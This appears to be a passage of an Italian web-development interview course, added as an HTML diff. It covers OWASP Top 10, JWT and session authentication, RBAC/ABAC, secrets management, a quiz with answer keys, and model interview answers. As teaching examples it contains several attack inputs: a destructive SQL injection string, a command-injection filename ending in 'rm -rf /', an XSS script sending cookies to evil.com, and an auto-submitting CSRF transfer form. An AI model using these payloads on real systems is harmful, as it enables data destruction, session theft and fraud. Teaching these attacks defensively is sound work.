+                    <p><strong>Risposta attesa:</strong> Sceglierei Token Bucket o Sliding Window per smoothness. Implementazione: 1) Redis per storage distribuito (INCR con TTL per fixed window, sorted sets per sliding window). 2) Identificazione client: API key, user ID, o IP (fallback). 3) Headers di risposta: X-RateLimit-Limit, Remaining, Reset. 4) 429 Too Many Requests con Retry-After quando superato. 5) Limiti differenziati: endpoint sensibili (login) più restrittivi, piani diversi per tier di pricing. In Kubernetes, posso anche usare rate limiting a livello di Ingress (nginx).</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Q: Quali sono i problemi principali di GraphQL e come li risolvi?</h4>
+                    <p><strong>Risposta attesa:</strong> 1) Query N+1: il resolver per "orders" fa N query per gli "items". Soluzione: DataLoader per batching e caching. 2) Query complexity attack: client può richiedere query profondamente nested che sovraccaricano il server. Soluzione: query depth limiting, complexity scoring, timeout. 3) Caching: POST su endpoint unico rompe HTTP cache. Soluzione: persisted queries (hash → query), caching a livello di resolver o CDN con @cacheControl directive. 4) Security: introspection espone lo schema. In produzione, disabilitalo o limitalo.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Q: Come documenti un'API REST?</h4>
+                    <p><strong>Risposta attesa:</strong> Uso OpenAPI (Swagger) 3.0 come standard. Due approcci: 1) Code-first: annotazioni nel codice (SpringDoc/Springfox) generano lo spec automaticamente. Pro: sempre sincronizzato. Contro: spec derivato dal codice, meno controllo. 2) Spec-first: scrivo lo YAML OpenAPI prima, poi genero code/stub. Pro: design-first, contratto chiaro. Contro: rischio drift. Complemento con: esempi di richieste reali, error codes documentati, Postman collection per testing interattivo, changelog per versioni.</p>
+                </div>
+            </section>
+
+            <!-- ==================== MODULO 10: SECURITY ==================== -->
+
+            <header class="module-header" id="modulo10">
+                <span class="module-tag">Modulo 10</span>
+                <h1>Security</h1>
+                <p>OWASP Top 10, Authentication, Authorization e secure coding practices</p>
+            </header>
+
+            <!-- OWASP Top 10 Section -->
+            <section class="section" id="modulo10-owasp">
+                <h2>OWASP Top 10: Le Vulnerabilità Più Critiche</h2>
+
+                <p>L'<strong>OWASP Top 10</strong> è la lista delle vulnerabilità di sicurezza più critiche per le applicazioni web. Conoscerle è fondamentale per ogni developer.</p>
+
+                <h3>1. Injection (SQL, NoSQL, Command)</h3>
+
+                <p>L'<strong>injection</strong> avviene quando dati non fidati vengono inviati a un interprete come parte di un comando o query. L'attaccante può eseguire comandi non autorizzati o accedere a dati.</p>
+
+                <pre><code class="language-java">// ❌ VULNERABILE: SQL Injection
+public User findUser(String username) {
+    String query = "SELECT * FROM users WHERE username = '" + username + "'";
+    // Se username = "admin'; DROP TABLE users; --"
+    // Query diventa: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
+    return jdbcTemplate.queryForObject(query, userMapper);
+}
+
+// ✅ SICURO: Prepared Statement con parametri
+public User findUser(String username) {
+    String query = "SELECT * FROM users WHERE username = ?";
+    return jdbcTemplate.queryForObject(query, userMapper, username);
+}
+
+// ✅ SICURO: JPA/Hibernate con parametri named
+@Query("SELECT u FROM User u WHERE u.username = :username")
+User findByUsername(@Param("username") String username);
+
+// ❌ VULNERABILE: Command Injection
+public void processFile(String filename) {
+    Runtime.getRuntime().exec("convert " + filename + " output.pdf");
+    // Se filename = "file.txt; rm -rf /"
+}
+
+// ✅ SICURO: Usa ProcessBuilder con array di argomenti
+public void processFile(String filename) {
+    ProcessBuilder pb = new ProcessBuilder("convert", filename, "output.pdf");
+    pb.start();  // Gli argomenti sono separati, non interpretati dalla shell
+}</code></pre>
+
+                <h3>2. Broken Authentication</h3>
+
+                <p>Autenticazione debole o mal implementata permette agli attaccanti di compromettere password, chiavi o token di sessione.</p>
+
+                <div class="info-box warning">
+                    <h4>Errori Comuni</h4>
+                    <ul>
+                        <li>Password in chiaro o con hashing debole (MD5, SHA1)</li>
+                        <li>Session ID prevedibile o esposto nell'URL</li>
+                        <li>Nessun rate limiting su login (permette brute force)</li>
+                        <li>Token che non scadono mai</li>
+                        <li>Password reset insicuro (token prevedibile, no expiry)</li>
+                    </ul>
+                </div>
+
+                <pre><code class="language-java">// ❌ SBAGLIATO: Hashing debole
+String hashedPassword = DigestUtils.md5Hex(password);  // MD5 è crackabile in secondi
+
+// ✅ CORRETTO: BCrypt con salt automatico
+@Bean
+public PasswordEncoder passwordEncoder() {
+    return new BCryptPasswordEncoder(12);  // Work factor 12 (2^12 iterazioni)
+}
+
+// Uso
+String hashedPassword = passwordEncoder.encode(rawPassword);
+boolean matches = passwordEncoder.matches(rawPassword, hashedPassword);</code></pre>
+
+                <h3>3. Cross-Site Scripting (XSS)</h3>
+
+                <p><strong>XSS</strong> avviene quando un'applicazione include dati non fidati in una pagina web senza validazione. L'attaccante può eseguire script nel browser della vittima.</p>
+
+                <div class="diagram">
+                    <pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        TIPI DI XSS                                           │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  STORED XSS (Persistente)                                                   │
+│  ─────────────────────────                                                   │
+│  1. Attacker salva script malevolo nel database (es. commento)              │
+│  2. Server serve la pagina con lo script                                    │
+│  3. Browser della vittima esegue lo script                                  │
+│  Esempio: Commento con &lt;script&gt;document.location='evil.com?c='+cookie&lt;/script&gt;│
+│                                                                              │
+│  REFLECTED XSS                                                              │
+│  ──────────────                                                              │
+│  1. Attacker invia URL malevolo alla vittima                                │
+│  2. Il parametro URL viene riflesso nella risposta senza escape             │
+│  3. Browser esegue lo script                                                │
+│  Esempio: /search?q=&lt;script&gt;alert('xss')&lt;/script&gt;                           │
+│                                                                              │
+│  DOM-BASED XSS                                                              │
+│  ──────────────                                                              │
+│  Lo script malevolo manipola il DOM client-side                             │
+│  Il payload non passa mai dal server                                        │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+                    </pre>
+                </div>
+
+                <pre><code class="language-java">// ❌ VULNERABILE: Output non escaped
+@GetMapping("/search")
+public String search(@RequestParam String q, Model model) {
+    model.addAttribute("query", q);  // Se q contiene &lt;script&gt;, verrà eseguito
+    return "search";
+}
+
+// Template Thymeleaf vulnerabile
+&lt;p&gt;Risultati per: &lt;span th:utext="${query}"&gt;&lt;/span&gt;&lt;/p&gt;  // utext = unescaped!
+
+// ✅ SICURO: Escape automatico
+&lt;p&gt;Risultati per: &lt;span th:text="${query}"&gt;&lt;/span&gt;&lt;/p&gt;  // text = escaped
+// &lt;script&gt; diventa &amp;lt;script&amp;gt;
+
+// ✅ SICURO: Content Security Policy header
+@Configuration
+public class SecurityConfig {
+    @Bean
+    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+        http.headers(headers -> headers
+            .contentSecurityPolicy(csp -> csp
+                .policyDirectives("default-src 'self'; script-src 'self'; style-src 'self'")
+            )
+        );
+        return http.build();
+    }
+}</code></pre>
+
+                <h3>4. Cross-Site Request Forgery (CSRF)</h3>
+
+                <p><strong>CSRF</strong> forza un utente autenticato a eseguire azioni indesiderate. L'attaccante sfrutta il fatto che il browser invia automaticamente i cookie di sessione.</p>
+
+                <pre><code class="language-html">&lt;!-- Pagina malevola dell'attacker --&gt;
+&lt;img src="https://bank.com/transfer?to=attacker&amount=10000" /&gt;
+&lt;!-- Il browser invia i cookie di bank.com → trasferimento eseguito! --&gt;
+
+&lt;!-- Form nascosto che si auto-submittà --&gt;
+&lt;form action="https://bank.com/transfer" method="POST" id="evil"&gt;
+    &lt;input name="to" value="attacker"&gt;
+    &lt;input name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('evil').submit();&lt;/script&gt;</code></pre>
+
+                <pre><code class="language-java">// ✅ PROTEZIONE: CSRF Token (Spring Security lo abilita di default)
+@Configuration
+public class SecurityConfig {
+    @Bean
+    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+        http
+            .csrf(csrf -> csrf
+                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
+            );
+        return http.build();
+    }
+}
+
+// Il form deve includere il token
+&lt;form method="POST"&gt;
+    &lt;input type="hidden" name="_csrf" th:value="${_csrf.token}"/&gt;
+    ...
+&lt;/form&gt;
+
+// Per API stateless (JWT), CSRF non è necessario se:
+// - Non usi cookie per l'auth
+// - Usi Authorization header con Bearer token</code></pre>
+
+                <h3>5. Security Misconfiguration</h3>
+
+                <div class="info-box warning">
+                    <h4>Errori di Configurazione Comuni</h4>
+                    <ul>
+                        <li>Stack trace esposti in produzione</li>
+                        <li>Directory listing abilitato</li>
+                        <li>Credenziali di default non cambiate</li>
+                        <li>Headers di sicurezza mancanti</li>
+                        <li>CORS troppo permissivo (<code>Access-Control-Allow-Origin: *</code>)</li>
+                        <li>Debug/admin endpoint esposti in produzione</li>
+                    </ul>
+                </div>
+
+                <pre><code class="language-yaml"># application-prod.yml - Configurazione sicura
+server:
+  error:
+    include-stacktrace: never      # Mai esporre stack trace
+    include-message: never
+
+spring:
+  devtools:
+    restart:
+      enabled: false               # Disabilita in prod
+  h2:
+    console:
+      enabled: false               # Disabilita console H2
+
+management:
+  endpoints:
+    web:
+      exposure:
+        include: health, info      # Solo endpoint necessari
+  endpoint:
+    health:
+      show-details: never          # Non esporre dettagli interni</code></pre>
+
+                <pre><code class="language-java">// Security Headers
+@Bean
+public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+    http.headers(headers -> headers
+        // Previene clickjacking
+        .frameOptions(frame -> frame.deny())
+        // Previene MIME sniffing
+        .contentTypeOptions(Customizer.withDefaults())
+        // Forza HTTPS
+        .httpStrictTransportSecurity(hsts -> hsts
+            .maxAgeInSeconds(31536000)
+            .includeSubDomains(true)
+        )
+        // Referrer policy
+        .referrerPolicy(referrer -> referrer
+            .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
+        )
+    );
+    return http.build();
+}</code></pre>
+            </section>
+
+            <!-- Authentication Section -->
+            <section class="section" id="modulo10-auth">
+                <h2>Authentication: Session vs Token</h2>
+
+                <h3>Session-Based Authentication</h3>
+
+                <div class="diagram">
+                    <pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    SESSION-BASED AUTHENTICATION                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  Client                            Server                    Session Store  │
+│    │                                  │                           │         │
+│    │ 1. POST /login                   │                           │         │
+│    │    {user, password}              │                           │         │
+│    │─────────────────────────────────▶│                           │         │
+│    │                                  │                           │         │
+│    │                                  │ 2. Verifica credenziali   │         │
+│    │                                  │ 3. Crea session           │         │
+│    │                                  │──────────────────────────▶│         │
+│    │                                  │    sessionId: abc123      │         │
+│    │                                  │    userId: 42             │         │
+│    │                                  │    roles: [ADMIN]         │         │
+│    │                                  │◀──────────────────────────│         │
+│    │ 4. Set-Cookie: JSESSIONID=abc123│                           │         │
+│    │◀─────────────────────────────────│                           │         │
+│    │                                  │                           │         │
+│    │ 5. GET /api/data                 │                           │         │
+│    │    Cookie: JSESSIONID=abc123     │                           │         │
+│    │─────────────────────────────────▶│                           │         │
+│    │                                  │ 6. Lookup session         │         │
+│    │                                  │──────────────────────────▶│         │
+│    │                                  │◀──────────────────────────│         │
+│    │ 7. 200 OK {data}                 │                           │         │
+│    │◀─────────────────────────────────│                           │         │
+│                                                                              │
+│  Pro: ✓ Revoca istantanea, ✓ Sicurezza (HttpOnly cookie)                   │
+│  Contro: ✗ Richiede session store condiviso, ✗ Non adatto a microservizi   │
+└─────────────────────────────────────────────────────────────────────────────┘
+                    </pre>
+                </div>
+
+                <h3>Token-Based Authentication (JWT)</h3>
+
+                <div class="diagram">
+                    <pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    JWT AUTHENTICATION                                        │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  Client                            Server                                    │
+│    │                                  │                                      │
+│    │ 1. POST /login                   │                                      │
+│    │    {user, password}              │                                      │
+│    │─────────────────────────────────▶│                                      │
+│    │                                  │                                      │
+│    │                                  │ 2. Verifica credenziali              │
+│    │                                  │ 3. Genera JWT (signed)               │
+│    │                                  │                                      │
+│    │ 4. {accessToken, refreshToken}   │                                      │
+│    │◀─────────────────────────────────│                                      │
+│    │                                  │                                      │
+│    │ 5. GET /api/data                 │                                      │
+│    │    Authorization: Bearer &lt;JWT&gt;   │                                      │
+│    │─────────────────────────────────▶│                                      │
+│    │                                  │ 6. Verifica firma JWT                │
+│    │                                  │    (NO database lookup!)             │
+│    │ 7. 200 OK {data}                 │                                      │
+│    │◀─────────────────────────────────│                                      │
+│                                                                              │
+│  Pro: ✓ Stateless, ✓ Scalabile, ✓ Cross-domain                             │
+│  Contro: ✗ No revoca istantanea, ✗ Token size, ✗ XSS se in localStorage    │
+└─────────────────────────────────────────────────────────────────────────────┘
+                    </pre>
+                </div>
+
+                <h3>JWT Deep Dive</h3>
+
+                <pre><code class="language-java">// Struttura JWT: header.payload.signature
+// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
+// eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.
+// SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+// Header (Base64)
+{
+  "alg": "HS256",    // Algoritmo di firma
+  "typ": "JWT"
+}
+
+// Payload (Base64) - Claims
+{
+  "sub": "user123",           // Subject (user ID)
+  "name": "John Doe",         // Custom claim
+  "email": "john@example.com",
+  "roles": ["USER", "ADMIN"], // Custom claim
+  "iat": 1706439600,          // Issued At
+  "exp": 1706443200,          // Expiration (1 ora)
+  "iss": "auth.example.com"   // Issuer
+}
+
+// Signature
+HMACSHA256(
+  base64UrlEncode(header) + "." + base64UrlEncode(payload),
+  secret
+)</code></pre>
+
+                <pre><code class="language-java">// Implementazione Spring Boot con jjwt
+@Service
+public class JwtService {
+    @Value("${jwt.secret}")
+    private String secret;
+
+    @Value("${jwt.expiration}")
+    private long expiration;
+
+    public String generateToken(UserDetails user) {
+        Map&lt;String, Object&gt; claims = new HashMap&lt;&gt;();
+        claims.put("roles", user.getAuthorities().stream()
+            .map(GrantedAuthority::getAuthority)
+            .toList());
+
+        return Jwts.builder()
+            .setClaims(claims)
+            .setSubject(user.getUsername())
+            .setIssuedAt(new Date())
+            .setExpiration(new Date(System.currentTimeMillis() + expiration))
+            .signWith(getSigningKey(), SignatureAlgorithm.HS256)
+            .compact();
+    }
+
+    public boolean validateToken(String token) {
+        try {
+            Jwts.parserBuilder()
+                .setSigningKey(getSigningKey())
+                .build()
+                .parseClaimsJws(token);
+            return true;
+        } catch (JwtException e) {
+            return false;  // Expired, invalid signature, malformed
+        }
+    }
+
+    public String extractUsername(String token) {
+        return extractClaim(token, Claims::getSubject);
+    }
+
+    private SecretKey getSigningKey() {
+        return Keys.hmacShaKeyFor(secret.getBytes());
+    }
+}</code></pre>
+
+                <div class="info-box warning">
+                    <h4>JWT Security Best Practices</h4>
+                    <ul>
+                        <li><strong>Short expiration</strong>: Access token 15min, refresh token 7 days</li>
+                        <li><strong>Algoritmo sicuro</strong>: HS256 minimo, RS256 per scenari multi-service</li>
+                        <li><strong>Non mettere dati sensibili</strong>: Il payload è solo encoded, non encrypted</li>
+                        <li><strong>Usa HttpOnly cookie</strong> per refresh token, localStorage è vulnerabile a XSS</li>
+                        <li><strong>Implementa token rotation</strong>: Nuovo refresh token ad ogni uso</li>
+                        <li><strong>Blacklist per logout</strong>: Traccia token revocati (se necessario)</li>
+                    </ul>
+                </div>
+
+                <h3>OAuth 2.0 Flows</h3>
+
+                <div class="diagram">
+                    <pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    OAUTH 2.0 AUTHORIZATION CODE FLOW                         │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  User        Client App       Authorization Server      Resource Server     │
+│   │              │                    │                       │             │
+│   │ 1. Click     │                    │                       │             │
+│   │   "Login"    │                    │                       │             │
+│   │─────────────▶│                    │                       │             │
+│   │              │                    │                       │             │
+│   │ 2. Redirect to Auth Server        │                       │             │
+│   │◀─────────────│                    │                       │             │
+│   │   /authorize?client_id=...        │                       │             │
+│   │              &redirect_uri=...    │                       │             │
+│   │              &scope=read+write    │                       │             │
+│   │              &state=xyz           │                       │             │
+│   │                                   │                       │             │
+│   │ 3. Login + Consent               │                       │             │
+│   │─────────────────────────────────▶│                       │             │
+│   │                                   │                       │             │
+│   │ 4. Redirect back with code        │                       │             │
+│   │◀──────────────────────────────────│                       │             │
+│   │   /callback?code=AUTH_CODE        │                       │             │
+│   │                                   │                       │             │
+│   │              │ 5. Exchange code   │                       │             │
+│   │              │    for tokens      │                       │             │
+│   │              │───────────────────▶│                       │             │
+│   │              │                    │                       │             │
+│   │              │ 6. {access_token,  │                       │             │
+│   │              │     refresh_token} │                       │             │
+│   │              │◀───────────────────│                       │             │
+│   │              │                    │                       │             │
+│   │              │ 7. GET /api/data   │                       │             │
+│   │              │    Authorization: Bearer token             │             │
+│   │              │───────────────────────────────────────────▶│             │
+│   │              │                    │                       │             │
+│   │              │ 8. {data}          │                       │             │
+│   │              │◀───────────────────────────────────────────│             │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+                    </pre>
+                </div>
+            </section>
+
+            <!-- Authorization Section -->
+            <section class="section" id="modulo10-authorization">
+                <h2>Authorization: RBAC vs ABAC</h2>
+
+                <h3>RBAC (Role-Based Access Control)</h3>
+
+                <p>In <strong>RBAC</strong>, i permessi sono assegnati a ruoli, e gli utenti sono assegnati a ruoli. Semplice ma può diventare rigido con requisiti complessi.</p>
+
+                <pre><code class="language-java">// Spring Security RBAC
+@Configuration
+@EnableMethodSecurity
+public class SecurityConfig {
+
+    @Bean
+    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+        http.authorizeHttpRequests(auth -> auth
+            .requestMatchers("/admin/**").hasRole("ADMIN")
+            .requestMatchers("/api/users/**").hasAnyRole("ADMIN", "USER_MANAGER")
+            .requestMatchers("/api/reports/**").hasAuthority("REPORT_VIEW")
+            .requestMatchers("/public/**").permitAll()
+            .anyRequest().authenticated()
+        );
+        return http.build();
+    }
+}
+
+// Method-level security
+@Service
+public class UserService {
+
+    @PreAuthorize("hasRole('ADMIN')")
+    public void deleteUser(Long id) { ... }
+
+    @PreAuthorize("hasRole('ADMIN') or #userId == authentication.principal.id")
+    public User getUser(Long userId) { ... }  // Admin o owner
+
+    @PostAuthorize("returnObject.department == authentication.principal.department")
+    public Document getDocument(Long id) { ... }  // Filtra dopo l'esecuzione
+}</code></pre>
+
+                <h3>ABAC (Attribute-Based Access Control)</h3>
+
+                <p><strong>ABAC</strong> decide l'accesso basandosi su attributi di utente, risorsa, ambiente. Più flessibile ma più complesso.</p>
+
+                <pre><code class="language-java">// ABAC con Spring Security SpEL
+@PreAuthorize("""
+    hasRole('DOCTOR') and
+    #patient.assignedDoctorId == authentication.principal.id and
+    T(java.time.LocalTime).now().isAfter(T(java.time.LocalTime).of(8, 0)) and
+    T(java.time.LocalTime).now().isBefore(T(java.time.LocalTime).of(18, 0))
+""")
+public MedicalRecord accessPatientRecord(Patient patient) {
+    // Solo il dottore assegnato, durante orario lavorativo
+}
+
+// Custom Permission Evaluator per logica complessa
+@Component
+public class CustomPermissionEvaluator implements PermissionEvaluator {
+
+    @Override
+    public boolean hasPermission(Authentication auth, Object target, Object permission) {
+        if (target instanceof Document doc) {
+            User user = (User) auth.getPrincipal();
+
+            return switch ((String) permission) {
+                case "READ" -> canRead(user, doc);
+                case "WRITE" -> canWrite(user, doc);
+                case "DELETE" -> canDelete(user, doc);
+                default -> false;
+            };
+        }
+        return false;
+    }
+
+    private boolean canRead(User user, Document doc) {
+        // Logica complessa: owner, shared with, public, same department, etc.
+        return doc.isPublic() ||
+               doc.getOwnerId().equals(user.getId()) ||
+               doc.getSharedWith().contains(user.getId()) ||
+               (doc.getDepartment().equals(user.getDepartment()) &&
+                user.hasPermission("DEPT_DOCS_READ"));
+    }
+}
+
+// Uso
+@PreAuthorize("hasPermission(#doc, 'READ')")
+public Document getDocument(Document doc) { ... }</code></pre>
+
+                <h3>Secrets Management</h3>
+
+                <div class="info-box warning">
+                    <h4>MAI Fare Questo</h4>
+                    <ul>
+                        <li>Hardcodare secrets nel codice</li>
+                        <li>Committare secrets in Git (anche in repo privati)</li>
+                        <li>Passare secrets come argomenti command line (visibili in ps)</li>
+                        <li>Loggare secrets</li>
+                    </ul>
+                </div>
+
+                <pre><code class="language-yaml"># ✅ CORRETTO: Environment variables (12-factor app)
+spring:
+  datasource:
+    password: ${DB_PASSWORD}
+
+# ✅ CORRETTO: Spring Cloud Config + Vault
+spring:
+  cloud:
+    vault:
+      uri: https://vault.example.com
+      authentication: KUBERNETES
+      kubernetes:
+        role: my-app
+      kv:
+        backend: secret
+        default-context: my-app
+
+# ✅ CORRETTO: AWS Secrets Manager
+@Value("${aws.secretsmanager.secret-name}")
+private String secretName;
+
+// Kubernetes Secrets
+apiVersion: v1
+kind: Secret
+metadata:
+  name: db-credentials
+type: Opaque
+data:
+  password: cGFzc3dvcmQxMjM=  # Base64 encoded
+
+# Mount come env var nel pod
+env:
+  - name: DB_PASSWORD
+    valueFrom:
+      secretKeyRef:
+        name: db-credentials
+        key: password</code></pre>
+            </section>
+
+            <!-- Quiz Section Modulo 10 -->
+            <section class="quiz-section" id="modulo10-quiz">
+                <h2>Interactive Challenge Quiz - Modulo 10</h2>
+                <p>Verifica la tua comprensione della Security.</p>
+
+                <!-- Question 46 -->
+                <div class="quiz-question" data-correct="c">
+                    <h4><span>Q1.</span> Un'applicazione usa <code>SELECT * FROM users WHERE id = '" + userId + "'"</code>. L'attacker invia userId = <code>1' OR '1'='1</code>. Cosa succede?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q46" id="q46a" value="a">
+                            <label for="q46a">Errore SQL: la query non è valida</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q46" id="q46b" value="b">
+                            <label for="q46b">Ritorna solo l'utente con ID '1' OR '1'='1'</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q46" id="q46c" value="c">
+                            <label for="q46c">Ritorna TUTTI gli utenti (bypass autenticazione)</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q46" id="q46d" value="d">
+                            <label for="q46d">Il database blocca automaticamente l'injection</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q46')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q46"></div>
+                </div>
+
+                <!-- Question 47 -->
+                <div class="quiz-question" data-correct="b">
+                    <h4><span>Q2.</span> Un JWT è stato rubato. Come impedisci che l'attacker lo usi?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q47" id="q47a" value="a">
+                            <label for="q47a">Cambia la secret key del server</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q47" id="q47b" value="b">
+                            <label for="q47b">Implementa una blacklist di token revocati</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q47" id="q47c" value="c">
+                            <label for="q47c">Aspetta che scada naturalmente</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q47" id="q47d" value="d">
+                            <label for="q47d">I JWT non possono essere rubati se firmati</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q47')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q47"></div>
+                </div>
+
+                <!-- Question 48 -->
+                <div class="quiz-question" data-correct="a">
+                    <h4><span>Q3.</span> Un form permette agli utenti di inserire una bio. Come previeni Stored XSS?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q48" id="q48a" value="a">
+                            <label for="q48a">Escape dell'output HTML quando renderizzi la bio</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q48" id="q48b" value="b">
+                            <label for="q48b">Validazione input: rifiuta qualsiasi carattere speciale</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q48" id="q48c" value="c">
+                            <label for="q48c">Usa HTTPS per cifrare i dati</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q48" id="q48d" value="d">
+                            <label for="q48d">Implementa rate limiting sul form</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q48')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q48"></div>
+                </div>
+
+                <!-- Question 49 -->
+                <div class="quiz-question" data-correct="d">
+                    <h4><span>Q4.</span> La tua API REST stateless usa JWT in Authorization header. Devi implementare protezione CSRF?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q49" id="q49a" value="a">
+                            <label for="q49a">Sì, CSRF è sempre necessario per le API</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q49" id="q49b" value="b">
+                            <label for="q49b">Sì, perché JWT può essere rubato con CSRF</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q49" id="q49c" value="c">
+                            <label for="q49c">Solo se l'API è accessibile da browser</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q49" id="q49d" value="d">
+                            <label for="q49d">No, CSRF sfrutta i cookie automatici. Authorization header non è automatico</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q49')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q49"></div>
+                </div>
+
+                <!-- Question 50 -->
+                <div class="quiz-question" data-correct="c">
+                    <h4><span>Q5.</span> Quale algoritmo di hashing password è raccomandato nel 2026?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q50" id="q50a" value="a">
+                            <label for="q50a">SHA-256 con salt random</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q50" id="q50b" value="b">
+                            <label for="q50b">MD5 con HMAC</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q50" id="q50c" value="c">
+                            <label for="q50c">BCrypt, Argon2, o scrypt (adaptive hashing)</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q50" id="q50d" value="d">
+                            <label for="q50d">AES-256 encryption</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q50')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q50"></div>
+                </div>
+            </section>
+
+            <!-- Questions Section Modulo 10 -->
+            <section class="section" id="modulo10-questions">
+                <h2>Domande da Colloquio - Modulo 10</h2>
+
+                <div class="info-box">
+                    <h4>Q: Spiega la differenza tra autenticazione e autorizzazione.</h4>
+                    <p><strong>Risposta attesa:</strong> L'autenticazione verifica CHI sei (identità): username/password, token, certificato. L'autorizzazione verifica COSA puoi fare (permessi): una volta autenticato, quali risorse puoi accedere? Esempio: login con credenziali = autenticazione. Controllo se puoi eliminare un utente = autorizzazione. Spring Security li separa: AuthenticationManager per autenticazione, AccessDecisionManager per autorizzazione. HTTP status: 401 = non autenticato, 403 = autenticato ma non autorizzato.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Q: Come preveniresti SQL Injection in un'applicazione Java?</h4>
+                    <p><strong>Risposta attesa:</strong> 1) Prepared Statements con parametri bind: <code>PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); ps.setInt(1, userId);</code>. Il database tratta il parametro come dato, mai come codice. 2) Con JPA/Hibernate: named parameters <code>@Query("SELECT u FROM User u WHERE u.id = :id")</code>. 3) Validazione input come layer aggiuntivo (whitelist, type checking). 4) Principle of least privilege: l'utente DB ha solo i permessi necessari. MAI concatenare stringhe per costruire query.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Q: Session vs JWT: quali sono i trade-off?</h4>
+                    <p><strong>Risposta attesa:</strong> Session: Pro - revoca istantanea (cancella session), HttpOnly cookie sicuro contro XSS. Contro - richiede session store condiviso (Redis) per scaling, sticky sessions o distributed cache. JWT: Pro - stateless, nessun lookup DB, scala orizzontalmente, ottimo per microservizi e cross-domain. Contro - no revoca istantanea (devi implementare blacklist), payload size maggiore, se rubato è valido fino a scadenza. Scelta: monolite con session, microservizi con JWT. Ibrido: JWT per access (short-lived), session/cookie per refresh (revocabile).</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Q: Come gestiresti i secrets in un ambiente Kubernetes?</h4>
+                    <p><strong>Risposta attesa:</strong> 1) Kubernetes Secrets base: meglio di hardcoded ma sono solo base64 encoded, non encrypted. 2) Sealed Secrets (Bitnami): encrypted con chiave del cluster, safe to commit. 3) External Secrets Operator: sincronizza da AWS Secrets Manager, Vault, etc. 4) HashiCorp Vault con injector sidecar: secrets iniettati come file o env vars. 5) SOPS per encryption at rest dei secret files. Best practice: secrets come env vars (non file), rotation automatica, audit logging, least privilege access. Mai loggare secrets.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Q: Cosa sono e come previeni XSS?</h4>
